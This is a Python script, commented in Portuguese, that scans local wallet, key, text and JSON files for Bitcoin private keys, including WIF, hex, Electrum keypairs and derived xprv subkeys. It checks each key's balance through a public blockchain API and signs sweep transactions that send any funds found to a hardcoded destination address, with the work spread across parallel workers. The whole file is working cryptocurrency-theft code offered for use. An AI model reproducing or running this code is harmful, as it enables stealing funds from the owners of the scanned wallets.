import json, re, os, requests, time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 10))

def create_raw_tx(wif, balance_sats):
    """Cria e assina o HEX real da transação (Sweep)"""
    try:
        k = Key(wif, network='bitcoin')
        fee = 2500 # Taxa fixa para garantir prioridade
        amount = balance_sats - fee
        if amount <= 546: return None
        
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except: return None

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    try:
        k = Key(priv_key_str, network='bitcoin')
        # Testa Legacy, P2SH e SegWit Nativo
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            target = original_addr if (original_addr and witness_type is None) else addr
            
            time.sleep(0.2) # Evita bloqueio de IP (Rate Limit)
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 1000:
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex:
                        print(f"HEX_GEN:{raw_hex}")
                        return True
            except: continue
    except: pass
    return False

def process_file(file_path):
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            # 1. Se for JSON (Electrum/Wallets)
            if '"keystore"' in content or '"keypairs"' in content:
                try:
                    data = json.loads(content)
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            check_balance_and_broadcast(priv, addr)
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        print(f"📦 Derivando xprv de: {file_path}")
                        master = Key(data['keystore']['xprv'])
                        for i in range(200): # Derivação profunda
                            check_balance_and_broadcast(master.subkey_for_path(f"0/{i}").wif())
                except: pass
            
            # 2. Scanner de texto puro (WIFs e HEX)
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            for key in set(wifs + hex_keys):
                check_balance_and_broadcast(key)
    except: pass

if __name__ == "__main__":
    exts = ('.wallet', '.txt', '.key', '.rtf', '.json')
    all_files = []
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.endswith(exts): all_files.append(os.path.join(root, f))
    
    all_files = sorted(all_files)
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | ARQUIVOS: {len(my_files)}")
    for f in my_files:
        print(f"🔍 Scan: {f}")
        process_file(f)
